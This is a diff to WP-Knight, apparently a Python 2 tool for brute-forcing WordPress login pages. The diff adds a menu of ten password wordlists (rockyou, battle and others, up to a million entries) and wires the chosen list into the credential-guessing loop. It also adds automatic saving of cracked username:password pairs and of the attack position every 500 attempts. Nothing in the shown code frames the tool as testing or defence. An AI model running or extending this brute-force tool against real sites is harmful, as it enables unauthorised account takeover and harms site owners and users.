@@ -59,6 +59,8 @@ debug_Mode = False
 login_URL = None
 uname = None
 pwd = None
+saveInt = 0
+listSel = 0
 
 def console():
 	while(True):
@@ -68,6 +70,7 @@ def console():
 	url - Specify target URL ( http://website.com/wp-login.php )
 	version - Check WordPress version ( Specify target URL first )
 	enumerate - Gather Usernames
+	list - Use Default List
 	go - Activate WP-Knight
 	exit - Exit WP-Knight
 			"""
@@ -82,6 +85,8 @@ def console():
 		elif cmd == "enumerate":
 			wpGet = raw_input("\n Enter URL ( http://website.com/ ) > ")
 			enumerate(wpGet)
+		elif cmd == "list":
+			list_config()
 		elif cmd == "url":
 			url_config()
 		elif cmd == "version":
@@ -90,7 +95,7 @@ def console():
 			else:
 				versionCheck()
 		else:
-			print "\n [!] Invalid Command\n"
+			print "\n [!] Invalid Command \n"
 
 def find_between( s, first, last ):
     try:
@@ -99,6 +104,46 @@ def find_between( s, first, last ):
         return s[start:end]
     except ValueError:
         return ""
+
+def list_config():
+	global listSel
+
+	print """\n [i] Select List:\n
+	1) best110 (110 passwords)
+	2) 500 worst passwords (500 passwords)
+	3) best 1050 (1050 passwords)
+	4) rockyou-10 (92 passwords)
+	5) rockyou-15 (249 passwords)
+	6) twitter-banned (370 passwords)
+	7) battle (4958 passwords)
+	8) battle 2 (31976 passwords)
+	9) battle 3 (100000 passwords)
+	10) battle 4 (1000000 passwords)
+	"""
+	listSel = raw_input(" Select List > ")
+
+	if listSel == '1':
+		print "\n [i] best110 Selected! \n"
+	elif listSel == '2':
+		print "\n [i] 500 worst passwords Selected! \n"
+	elif listSel == '3':
+		print "\n [i] best 1050 Selected! \n"
+	elif listSel == '4':
+		print "\n [i] rockyou-10 Selected! \n"
+	elif listSel == '5':
+		print "\n [i] rockyou-15 Selected! \n"
+	elif listSel == '6':
+		print "\n [i] twitter-banned Selected! \n"
+	elif listSel == '7':
+		print "\n [i] battle Selected! \n"
+	elif listSel == '8':
+		print "\n [i] battle 2 Selected! \n"
+	elif listSel == '9':
+		print "\n [i] battle 3 Selected! \n"
+	elif listSel == '10':
+		print "\n [i] battle 4 Selected! \n"
+	else:
+		print "\n [!] Invalid Selection \n"
 
 def url_config():
 	global login_URL
@@ -149,15 +194,60 @@ def enumerate(wpURL):
         extract_users(the_json=json)
     print ""
 
+# Automatic save upon cracked
+def crack_save(uname,pwd):
+	try:
+		file = open('cracked.txt', 'w')
+		file.write("Previous Cracked Password (%s:%s)" % (uname, pwd))
+		file.close()
+	except:
+		print "\n [!] Save Error \n"
+
+# Automatic save during attack
+def cycle_save(uname,pwd):
+	try:
+		file = open('saved.txt', 'w')
+		file.write("Your Last Cycle Position (%s:%s)" % (uname, pwd))
+		file.close()
+	except:
+		print "\n [!] Save Error \n"
+
 def bruteforce():
 	global aPlace
 	global bPlace
 	global keyword
 	global host
 	global login_URL
+	global listSel
 
+	# Load Username List
 	text_file = open("list.txt", "r")
-	text_file2 = open("pw.txt", "r")
+
+	# Load Password List
+	if listSel == 0:
+		text_file2 = open("pw.txt", "r")
+	elif listSel == '1':
+		text_file2 = open("lists/best110.txt", "r")
+	elif listSel == '2':
+		text_file2 = open("lists/500-worst-passwords.txt", "r")
+	elif listSel == '3':
+		text_file2 = open("lists/best1050.txt", "r")
+	elif listSel == '4':
+		text_file2 = open("lists/rockyou-10.txt", "r")
+	elif listSel == '5':
+		text_file2 = open("lists/rockyou-15.txt", "r")
+	elif listSel == '6':
+		text_file2 = open("lists/twitter-banned.txt", "r")
+	elif listSel == '7':
+		text_file2 = open("lists/battle.txt", "r")
+	elif listSel == '8':
+		text_file2 = open("lists/battle2.txt", "r")
+	elif listSel == '9':
+		text_file2 = open("lists/battle3.txt", "r")
+	elif listSel == '10':
+		text_file2 = open("lists/battle4.txt", "r")
+
+	saveInt = 0
 
 	with requests.Session() as c:
 	
@@ -181,6 +271,7 @@ def bruteforce():
 				uname = u
 				pwd = p
 				progressBar.update(1)
+				saveInt = saveInt + 1
 
 				try:
 
@@ -212,11 +303,14 @@ def bruteforce():
 					if cookie.find('settings')>-1 or cookie.find('=' + uname)>-1:
 						progressBar.close()
 						print "\n Cracked [ %s : %s ] \n" % (u,p)
+						crack_save(u,p)
 						break
-
 				except:
-
 					print "\n [!] Connection Error \n"
+
+				# Save your position every 500 cycles
+				if saveInt % 500 == 0:
+					cycle_save(u,p)
 
 		text_file.close()
 		text_file2.close()
